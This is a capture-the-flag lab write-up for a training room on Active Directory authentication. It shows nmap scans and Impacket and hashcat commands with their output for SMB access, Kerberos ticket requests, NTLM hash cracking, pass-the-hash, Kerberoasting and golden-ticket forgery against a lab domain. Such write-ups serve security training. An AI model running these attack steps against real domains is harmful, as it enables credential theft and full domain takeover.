## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
 When you first gain access to an Active Directory (AD) environment, one of the most important things to understand is how authentication works. Authentication is the process by which users and computers to prove their identities before being granted access to network resources. Without a solid understanding of how this works, it becomes difficult to identify weaknesses or plan an effective attack path.

In this room, we will explore how authentication functions within AD environments. You will learn about the two primary authentication protocols used in Windows domains, namely NTLM and Kerberos, and gain hands-on experience identifying which protocol is being used during a live session. This foundational knowledge is essential before moving on to more advanced topics, such as credential harvesting, relay attacks, and ticket-based exploitation, covered in later rooms.

## Learning Objectives

In this room, you will learn:

- What authentication means in an Active Directory environment
- The difference between authentication and authorisation
- How NTLM and Kerberos authentication work at a high level
- How to identify which authentication protocol was used during login
- Common weaknesses in AD authentication that attackers can exploit
```
## Network 
```bash
$ ip a
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 192.168.21.15/24 brd 192.168.21.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::c698:fba1:ca08:8c0e/64 scope link stable-privacy proto kernel_ll
       valid_lft forever preferred_lft forever

$ ip route
default via 192.168.40.2 dev eth0 proto dhcp src 192.168.40.128 metric 100
192.168.11.0/24 via 192.168.21.1 dev tun0 metric 1000
192.168.21.0/24 dev tun0 proto kernel scope link src 192.168.21.15
192.168.40.0/24 dev eth0 proto kernel scope link src 192.168.40.128 metric 100

$ ifconfig
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 192.168.21.15  netmask 255.255.255.0  destination 192.168.21.15
        inet6 fe80::c698:fba1:ca08:8c0e  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 144 (144.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
- My Own IP 
```IP 
- Network = 192.168.21.0/24
- My IP   = 192.168.21.15
```
----
## Enumeration 
-  Network Scan
```bash
$ TARGET=192.168.21.0/24
$ nmap $TARGET -sn -o host.txt
$ cat host.txt
 192.168.21.1 - //VPN Service 
 192.168.21.14 - TARGET
 192.168.21.15 - OWN Machine
```
- IP - `192.168.21.1`
```bash
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5000/tcp open  upnp
8000/tcp open  http-alt
```
- Target Scan - `192.168.21.14`
```bash
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
53/tcp   open  domain        syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
81/tcp   open  hosts2-ns     syn-ack ttl 63
111/tcp  open  rpcbind       syn-ack ttl 63
389/tcp  open  ldap          syn-ack ttl 63
3389/tcp open  ms-wbt-server syn-ack ttl 63
5901/tcp open  vnc-1         syn-ack ttl 63
6001/tcp open  X11:1         syn-ack ttl 63
7777/tcp open  cbt           syn-ack ttl 62
7778/tcp open  interwise     syn-ack ttl 62
```
- Enumerate Services 
```bash
PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ee:75:c9:9a:78:86:0b:b4:d0:11:3c:eb:3d:fb:40:02 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdqdKiJdKSjUndNOV6qxzkUnGXQ077hFgl75BVHWxc6GuXzy5okjxHjaE6BqUX1xGMWZe/9DSvly5WEVfwyoeOXhXI52n6Thkk4A1cRs+TrwlBEYMd2rVln/mNH1EbdTxatkigShNkrzJXPGHMYaRVJWfwKX0kZftZdEG9RqxvMQd2fcqCfsSSflTns4+9tAKevjKKZiKZRNg0RHCSEMKg7GLky22ruZu/eYADBg0d6u3JoNSiLYvx58W0bLJ+S7ZL1DIZ5DrCbJhdZmWaBMZJUSiC10b2iftqjdaYsUgqtCOIlbHBHeuphzmei3TRKZAfBSWFcH4vujcADZXFgd4mOzIME63+1EPu4IB2Mdb2cWwjuqxwRyxrmRE6OjZ9s+ogpl+rN7SL51jM4tkngsop++Z8BIFb7K8Vwr8Az42t0HxZGaAJYgjuZcNEaLtSfpdPGEl7R8o8qpfPSsheWTZbpAyMN6ub28S2wEHiqa9HyJvAhc6MeuKRRco2zK2p0hc=
|   256 25:a7:69:40:1e:8e:0b:d9:4a:bf:30:61:c8:18:8e:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqsGHseBE3IltjbZ2bXPr/TsXEZalL/s1Ht3zvwiiyrNVLgXst8eknwRSbCAGb59OqRV4aJU8O+kl2e4/JTgzQ=
|   256 de:aa:08:d5:d0:68:43:57:cb:75:1b:3d:c1:51:80:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHX0QZs/E4JLmjqJJbnrQtOT8eAGwYrKX/AATn9sduDO
53/tcp   open  domain        syn-ack ttl 63 dnsmasq 2.90
| dns-nsid:
|_  bind.version: dnsmasq-2.90
80/tcp   open  http          syn-ack ttl 63 Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
81/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
111/tcp  open  rpcbind       syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
389/tcp  open  ldap          syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
3389/tcp open  ms-wbt-server syn-ack ttl 63 Microsoft Terminal Service
5901/tcp open  vnc           syn-ack ttl 63 VNC (protocol 3.8)
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes:
|     VNC auth, Anonymous TLS (258)
|_    Unknown security type (2)
6001/tcp open  X11           syn-ack ttl 63 (access denied)
7777/tcp open  http          syn-ack ttl 62 nginx 1.25.5
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: CyberChef
|_http-server-header: nginx/1.25.5
7778/tcp open  http          syn-ack ttl 62 OpenWrt uHTTPd
|_http-favicon: Unknown favicon MD5: 540FE96254A8EA459933C31A98BDF45A
| http-methods:
|_  Supported Methods: GET HEAD POST
| http-git:
|   192.168.21.14:7778/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/0dayCTF/reverse-shell-generator
|_http-title: Online - Reverse Shell Generator
```
----
##### SMB 
```bash
 impacket-smbclient thm.loc/claire:'[password omitted]'@192.168.11.51
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
SHARE1
SHARE2
SHARE3
SHARE4
SHARE5
SHARE6
# use SHARE1
# ls
drw-rw-rw-          0  Sun Feb  8 09:57:52 2026 .
drw-rw-rw-          0  Sun Feb  8 09:57:52 2026 ..
-rw-rw-rw-         41  Sun Feb  8 09:57:52 2026 flag1.txt
# get flag1.txt
#
$ cat flag1.txt
[flag omitted] 
```
----
##### Kerberos
```bash
$ impacket-getTGT thm.loc/mary:'[password omitted]' -dc-ip 192.168.11.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in mary.ccache

$ export KRB5CCNAME=mary.ccache

$ klist -c mary.ccache
Ticket cache: FILE:mary.ccache
Default principal: mary@THM.LOC

$ impacket-smbclient thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
SHARE1
SHARE2
SHARE3
SHARE4
SHARE5
SHARE6
# use SHARE2
# ls
drw-rw-rw-          0  Sun Feb  8 09:58:12 2026 .
drw-rw-rw-          0  Sun Feb  8 09:58:12 2026 ..
-rw-rw-rw-         41  Sun Feb  8 09:58:12 2026 flag2.txt
# get flag2.txt

$ cat flag2.txt
[flag omitted]
```
- Got the hash
```bash
$nano hash.txt
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```
- Lets Crack it
```bash
$ hashcat hash.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1000 | NTLM | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

[hash omitted]:[password omitted]

$ impacket-getTGT thm.loc/phillip:'[password omitted]' -dc-ip 192.168.11.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in phillip.ccache

$ export KRB5CCNAME=phillip.ccache

$ impacket-smbclient thm.loc/phillip@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
SHARE1
SHARE2
SHARE3
SHARE4
SHARE5
SHARE6
# use SHARE3
# ls
drw-rw-rw-          0  Sun Feb  8 09:58:42 2026 .
drw-rw-rw-          0  Sun Feb  8 09:58:42 2026 ..
-rw-rw-rw-         41  Sun Feb  8 09:58:42 2026 flag3.txt
```
- Flag
```bash
$ cat flag3.txt
[flag omitted] 
```
- Login With Hash
```bash
$ impacket-smbclient thm.loc/ben@192.168.11.51 -hashes [lmhash omitted]:[nthash omitted]

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
SHARE1
SHARE2
SHARE3
SHARE4
SHARE5
SHARE6
# use SHARE4
# get flag4.txt

$ cat flag4.txt
[flag omitted] 
```
- Service Ticket Attack
```bash
$ impacket-GetUserSPNs thm.loc/claire:'[password omitted]' -dc-ip 192.168.11.100 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------  -----------  --------  --------------------------  ---------  ----------
http/svc_print.thm.loc  svc_printer            2026-02-08 12:13:08.795049  <never>

$krb5tgs$23$*svc_printer$THM.LOC$thm.loc/svc_printer*$[hash omitted]

$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
$ hashcat hash --show
[password omitted]

$ impacket-smbclient 'thm.loc/svc_printer:[password omitted]'@192.168.11.51
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use SHARE5
# get flag5.txt
 cat flag5.txt
[flag omitted] 
```
- Golder Ticket Attack 
```bash
$ impacket-ticketer  -nthash [nthash omitted] -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for thm.loc/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache

$ export KRB5CCNAME=Administrator.ccache

$ impacket-smbclient thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use SHARE6
# get flag6.txt

$ cat flag6.txt
[flag omitted] 
```
# END